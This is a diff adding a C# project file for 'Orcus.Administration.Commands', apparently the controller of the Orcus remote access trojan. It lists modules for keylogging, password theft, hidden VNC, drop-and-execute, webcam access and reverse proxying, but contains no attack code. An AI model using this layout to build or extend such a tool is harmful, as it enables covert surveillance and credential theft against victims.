@@ -1,0 +1,185 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{917798E0-C646-4616-B6ED-5A2D2AC87FF6}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Orcus.Administration.Commands</RootNamespace>
+    <AssemblyName>Orcus.Administration.Commands</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>TRACE;DEBUG</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <!-- <Import Project="$(SolutionDir)\Build\Orcus.PreSettings.targets" /> !-->
+  <ItemGroup>
+    <Reference Include="CSCore, Version=1.2.1.2, Culture=neutral, PublicKeyToken=5a08f2b6f4415dea, processorArchitecture=MSIL">
+      <HintPath>..\packages\CSCore.1.2.1.2\lib\net35-client\CSCore.dll</HintPath>
+    </Reference>
+    <Reference Include="FluentCommandLineParser, Version=1.4.3.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\FluentCommandLineParser.1.4.3\lib\net35\FluentCommandLineParser.dll</HintPath>
+    </Reference>
+    <Reference Include="Lidgren.Network, Version=2012.1.7.0, Culture=neutral, PublicKeyToken=851aa33cb9b88f1c, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\References\Lidgren.Network.dll</HintPath>
+    </Reference>
+    <Reference Include="PresentationCore" />
+    <Reference Include="PresentationFramework" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Xaml" />
+    <Reference Include="TurboJpegWrapper">
+      <HintPath>..\References\TurboJpegWrapper.dll</HintPath>
+    </Reference>
+    <Reference Include="WindowsBase" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="..\Orcus\Commands\RemoteDesktop\Compression\TurboJpgImageCompression.cs">
+      <Link>Commands\RemoteDesktop\Compression\TurboJpgImageCompression.cs</Link>
+    </Compile>
+    <Compile Include="..\Orcus\Commands\VoiceChat\Utilities\CSCoreDataPlayer.cs">
+      <Link>Commands\VoiceChat\Utilities\CSCoreDataPlayer.cs</Link>
+    </Compile>
+    <Compile Include="..\Orcus\Commands\VoiceChat\Utilities\CSCoreRecorder.cs">
+      <Link>Commands\VoiceChat\Utilities\CSCoreRecorder.cs</Link>
+    </Compile>
+    <Compile Include="Commands\ActiveConnections\ActiveConnectionsCommand.cs" />
+    <Compile Include="Commands\AudioVolumeControl\AudioVolumeControlCommand.cs" />
+    <Compile Include="Commands\Audio\AudioCommand.cs" />
+    <Compile Include="Commands\Audio\AudioFile.cs" />
+    <Compile Include="BitmapSourceConverter.cs" />
+    <Compile Include="Commands\ClientCommands\ClientCommandsCommand.cs" />
+    <Compile Include="Commands\ClipboardManager\ClipboardManagerCommand.cs" />
+    <Compile Include="Commands\Code\CodeCommand.cs" />
+    <Compile Include="Commands\ComputerInformation\ComputerInformationCommand.cs" />
+    <Compile Include="Commands\ConnectionInitializer\ConnectionInitializerCommand.cs" />
+    <Compile Include="Commands\ConnectionInitializer\Connections\NetServerConnection.cs" />
+    <Compile Include="Commands\ConnectionInitializer\Connections\ServerConnection.cs" />
+    <Compile Include="Commands\ConnectionInitializer\Connections\TcpClientConnection.cs" />
+    <Compile Include="Commands\ConnectionInitializer\InitializedConnection.cs" />
+    <Compile Include="Commands\Console\ConsoleCommand.cs" />
+    <Compile Include="Commands\DeviceManager\DeviceChangedEventArgs.cs" />
+    <Compile Include="Commands\DeviceManager\DeviceInfoExtensions.cs" />
+    <Compile Include="Commands\DeviceManager\DeviceManagerCommand.cs" />
+    <Compile Include="Commands\DropAndExecute\DropAndExecuteCommand.cs" />
+    <Compile Include="Commands\DropAndExecute\RenderEngine.cs" />
+    <Compile Include="Commands\DropAndExecute\RenderWindow.cs" />
+    <Compile Include="Commands\DropAndExecute\UploadTask.cs" />
+    <Compile Include="Commands\EventLog\EventLogCommand.cs" />
+    <Compile Include="Commands\ConnectionInitializer\ConnectionException.cs" />
+    <Compile Include="Commands\ConnectionInitializer\DataReceivedEventArgs.cs" />
+    <Compile Include="Commands\ConnectionInitializer\IConnection.cs" />
+    <Compile Include="Commands\ConnectionInitializer\Connections\SocketConnection.cs" />
+    <Compile Include="Commands\ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="Commands\ReverseProxy\ReverseProxyCommand.cs" />
+    <Compile Include="Commands\VoiceChat\VoiceChatCommand.cs" />
+    <Compile Include="Commands\WindowsDrivers\DriversFileContentReceivedEventArgs.cs" />
+    <Compile Include="Commands\WindowsDrivers\WindowsDriversCommand.cs" />
+    <Compile Include="Extensions\FormatBytesConverter.cs" />
+    <Compile Include="Extensions\StringExtensions.cs" />
+    <Compile Include="Commands\FileExplorer\FileExplorerCommand.cs" />
+    <Compile Include="Commands\FileExplorer\EntryExtensions.cs" />
+    <Compile Include="Commands\FileExplorer\ShellPropertyHelper.cs" />
+    <Compile Include="Commands\Fun\FunCommand.cs" />
+    <Compile Include="Commands\HiddenApplication\HiddenApplicationCommand.cs" />
+    <Compile Include="Commands\HiddenApplication\RenderEngine.cs" />
+    <Compile Include="Commands\HiddenApplication\WindowRenderInfo.cs" />
+    <Compile Include="Commands\HVNC\HvncCommand.cs" />
+    <Compile Include="Commands\HVNC\RenderEngine.cs" />
+    <Compile Include="Commands\HVNC\WindowRenderInfo.cs" />
+    <Compile Include="Commands\LiveKeylogger\LiveKeyloggerCommand.cs" />
+    <Compile Include="Commands\LivePerformance\LivePerformanceCommand.cs" />
+    <Compile Include="Commands\MessageBox\MessageBoxCommand.cs" />
+    <Compile Include="Native\IPropertyDescription.cs" />
+    <Compile Include="Native\MapVirtualKeyMapTypes.cs" />
+    <Compile Include="Native\NativeMethods.cs" />
+    <Compile Include="Native\PropertyKey.cs" />
+    <Compile Include="Commands\Passwords\PasswordsCommand.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Commands\Registry\AdvancedRegistrySubKey.cs" />
+    <Compile Include="Commands\Registry\RegistryCommand.cs" />
+    <Compile Include="Commands\Registry\RegistryExtensions.cs" />
+    <Compile Include="Commands\Registry\RegistryKeyChangedEventArgs.cs" />
+    <Compile Include="Commands\Registry\RegistryValuesReceivedEventArgs.cs" />
+    <Compile Include="Commands\Registry\SubKeysReceivedEventArgs.cs" />
+    <Compile Include="Commands\ConnectionInitializer\SendArp.cs" />
+    <Compile Include="Commands\RemoteDesktop\RemoteDesktopCommandLocal.cs" />
+    <Compile Include="Commands\StartupManager\EntryChangedEventArgs.cs" />
+    <Compile Include="Commands\StartupManager\StartupManagerCommand.cs" />
+    <Compile Include="Commands\SystemRestore\SystemRestoreCommand.cs" />
+    <Compile Include="Commands\TaskManager\AdvancedProcessInfo.cs" />
+    <Compile Include="Commands\TaskManager\TaskmanagerCommand.cs" />
+    <Compile Include="Commands\TextChat\ChatMessage.cs" />
+    <Compile Include="Commands\TextChat\TextChatCommand.cs" />
+    <Compile Include="Commands\UninstallPrograms\AdvancedUninstallableProgram.cs" />
+    <Compile Include="Commands\UninstallPrograms\UninstallProgramsCommand.cs" />
+    <Compile Include="UploadProgressChangedEventArgs.cs" />
+    <Compile Include="Commands\UserInteraction\UserInteractionCommand.cs" />
+    <Compile Include="Commands\Webcam\WebcamCommand.cs" />
+    <Compile Include="Commands\WindowManager\AdvancedWindowInformation.cs" />
+    <Compile Include="Commands\WindowManager\WindowManagerCommand.cs" />
+    <Compile Include="Commands\WindowsCustomizer\BooleanPropertyChangedEventArgs.cs" />
+    <Compile Include="Commands\WindowsCustomizer\WindowsCustomizerCommand.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Libraries\OpusWrapper\OpusWrapper.csproj">
+      <Project>{f07d69a2-8847-4ade-b9c6-05345cc8ed5b}</Project>
+      <Name>OpusWrapper</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Administration.Plugins\Orcus.Administration.Plugins.csproj">
+      <Project>{BEE3B0EA-ABAE-43F3-A377-763E1A28C967}</Project>
+      <Name>Orcus.Administration.Plugins</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Plugins\Orcus.Plugins.csproj">
+      <Project>{0d743e5d-0d5f-4b9b-b2df-1f607b5031c4}</Project>
+      <Name>Orcus.Plugins</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Shared.Utilities\Orcus.Shared.Utilities.csproj">
+      <Project>{E23E8C6F-6F71-4954-8A42-FBA873B86E5E}</Project>
+      <Name>Orcus.Shared.Utilities</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Orcus.Shared\Orcus.Shared.csproj">
+      <Project>{4030F3BD-8F20-483B-B87B-C1BE34DBEBFC}</Project>
+      <Name>Orcus.Shared</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Sorzus.Wpf.Toolkit\Sorzus.Wpf.Toolkit.csproj">
+      <Project>{bf0e0718-3e64-4246-a17f-594dcf19edfc}</Project>
+      <Name>Sorzus.Wpf.Toolkit</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="packages.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- <Import Project="$(SolutionDir)\Build\Orcus.PostSettings.targets" /> -->
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
